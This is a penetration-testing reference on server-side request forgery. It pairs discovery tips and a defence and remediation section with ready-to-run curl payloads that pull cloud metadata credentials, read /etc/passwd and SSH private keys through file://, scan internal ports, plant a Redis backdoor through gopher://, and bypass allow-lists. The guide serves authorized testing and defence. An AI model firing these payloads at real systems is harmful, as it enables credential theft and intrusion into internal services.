# Server-Side Request Forgery (SSRF)

> Server fetches an attacker-controlled URL → access internal services, cloud metadata, file:// reads, port scanning, etc. Authorized testing only. Map: OWASP WSTG-INPV-19, CWE-918. Cloud-metadata-specific paths in [../cloud/ssrf-cloud-metadata.md](../cloud/ssrf-cloud-metadata.md).

## TL;DR
- Find any feature where the server takes a URL from the user and fetches it: webhook setup, image-by-URL upload, RSS reader, screenshot service, PDF/HTML renderer, OAuth redirect-flow callbacks, "import from URL", `<img>` tags rendered server-side.
- Two SSRF variants:
  - **In-band**: response body / status code / headers comes back to the attacker → exfil.
  - **Blind**: only side-effects; confirm via OOB DNS / HTTP listener (Burp Collaborator, `interactsh`).
- Highest-impact targets: cloud metadata (IMDS — see cloud file), internal admin interfaces (no-auth at internal IPs), Redis/Memcached unauth ports, internal HTTP services that act on URL params (gopher://, etc.).
- Defence: hostname allow-list, DNS-pin, block private/link-local on resolved IP, no HTTP redirects across resolution, dedicated egress proxy.

## Detection / Discovery

### Where to look
| Feature | Why |
| --- | --- |
| Webhook URL config | Direct user-supplied destination. |
| "Fetch from URL" import (CSV/RSS/OPML/JSON) | Server fetches and parses. |
| Profile picture upload by URL | Server fetches the image. |
| OAuth callback / `redirect_uri` chain | Limited, but reachable. |
| Server-side PDF / HTML renderer (`wkhtmltopdf`, `headless-chrome` taking attacker HTML) | Render-time `<img src>`, `<link>`, `<iframe>` all fetched. |
| Logo/favicon upload by URL | Same as image upload. |
| Markdown image preview | Server fetches to thumbnail. |
| `<svg>` rendering with `<image>` href | XML-fetcher; also XXE surface. |
| Health check / monitoring endpoints accepting URL | Operations features that admins forget. |

### Smoke test
```bash
# Use Burp Collaborator / interactsh for a unique token URL per probe
COLLAB="abc123.oastify.com"
curl -X POST https://target/webhook -d "url=http://$COLLAB/probe"
# Then check Collaborator panel for inbound DNS + HTTP hit.
```

## Exploitation

### Internal-service hit
```bash
# Reach the internal admin app behind the front-end
curl -X POST https://target/import \
     -d 'url=http://127.0.0.1:8080/admin/users'
# Or via 10.x.x.x internal IPs
curl -X POST https://target/import -d 'url=http://10.1.2.3:9200/_cat/indices'
# Elasticsearch unauth on internal port → full index dump
```

### Cloud metadata (see [../cloud/ssrf-cloud-metadata.md](../cloud/ssrf-cloud-metadata.md))
```bash
# AWS IMDSv1 (when not enforced to v2)
curl -X POST https://target/import -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# GCP (header required)
curl -X POST https://target/import \
     -d 'url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
     -d 'header=Metadata-Flavor: Google'
```

### File read via `file://`
If the SSRF library uses libcurl with file protocol enabled:
```bash
curl -X POST https://target/fetch -d 'url=file:///etc/passwd'
curl -X POST https://target/fetch -d 'url=file:///proc/self/environ'
curl -X POST https://target/fetch -d 'url=file:///root/.ssh/id_rsa'
```

### `gopher://` for arbitrary TCP / second-protocol
Gopher can construct arbitrary bytes — Redis / Memcached / SMTP exploitation classic.
```
url=gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aFLUSHALL%0d%0a%2A3%0d%0a...
# CRLF-encoded Redis pipeline that sets an SSH authorized_keys backdoor
```
Reference SSRF→Redis→shell chain: HackTricks SSRF page.

### Port scanning via timing / banner
```bash
for p in 22 25 80 3306 6379 8080 9200 27017; do
  start=$(date +%s.%N)
  curl -X POST https://target/import -d "url=http://127.0.0.1:$p/" -o /dev/null -s
  echo "port=$p delay=$(echo $(date +%s.%N) - $start | bc)"
done
# Faster response → port closed; slower (with successful connect / banner) → open.
```

### DNS rebinding
1. Control `evil.tld` that resolves first to `1.2.3.4` (public IP — passes allow-list), then to `127.0.0.1` (private — actual fetch).
2. Server checks the URL → resolves `evil.tld` → first IP allowed → second IP (post-revalidation gap) is the link-local target.
3. Tools: `singularity` (https://github.com/nccgroup/singularity), public DNS rebinding services (rbndr.us).

## Bypasses
- URL parser confusion: `http://127.0.0.1@evil.com/`, `http://2130706433/` (decimal), `http://0x7f000001/` (hex), `http://[::1]/`, `http://[::ffff:7f00:1]/`.
- Domain that resolves to private IP: `localtest.me`, `127.0.0.1.nip.io`, `lvh.me` → DNS returns `127.0.0.1`.
- HTTP redirect (3xx) — attacker's URL returns `Location: http://127.0.0.1/`. Server follows; allow-list only checked first hop.
- IPv6 mapping: `[0:0:0:0:0:ffff:169.254.169.254]`.
- DNS rebinding (above).

## Defence / Remediation
- **Hostname allow-list** of destinations the feature legitimately needs. Default-deny otherwise (CWE-918).
- **Resolve first, validate second, connect to the resolved IP** — don't re-resolve mid-redirect (DNS-pinning).
- **Block private / link-local / loopback** on the *resolved IP*, not the hostname string. Block ranges:
  - 0.0.0.0/8, 10.0.0.0/8, 100.64.0.0/10 (CGNAT), 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.0.0.0/24, 192.168.0.0/16, 198.18.0.0/15, ff00::/8, fe80::/10, fc00::/7, ::1/128, 169.254.169.254/32 (cloud IMDS).
- **Disable HTTP redirects** in the SSRF-prone fetcher; if you must follow, re-validate each hop against the allow-list.
- **Disable protocols** other than http/https: no `file://`, no `gopher://`, no `ftp://`, no `dict://`. In curl: `--proto =http,https`.
- **Dedicated egress proxy** — fetcher process can only reach the internet via an HTTP proxy that itself enforces the allow-list + private-IP block. Defense-in-depth + central audit log.
- **Network policy**: block the fetcher from reaching 169.254.169.254 + internal subnets at the firewall layer.
- See cloud-specific controls in [../cloud/ssrf-cloud-metadata.md](../cloud/ssrf-cloud-metadata.md).

## Sources
- OWASP WSTG-INPV-19 Testing for SSRF: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
- OWASP Cheat Sheet — SSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger — SSRF: https://portswigger.net/web-security/ssrf
- PayloadsAllTheThings SSRF: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- HackTricks SSRF: https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
- singularity DNS rebinding: https://github.com/nccgroup/singularity
- Orange Tsai — "A New Era of SSRF" BlackHat 2017: https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
- CWE-918 Server-Side Request Forgery: https://cwe.mitre.org/data/definitions/918.html
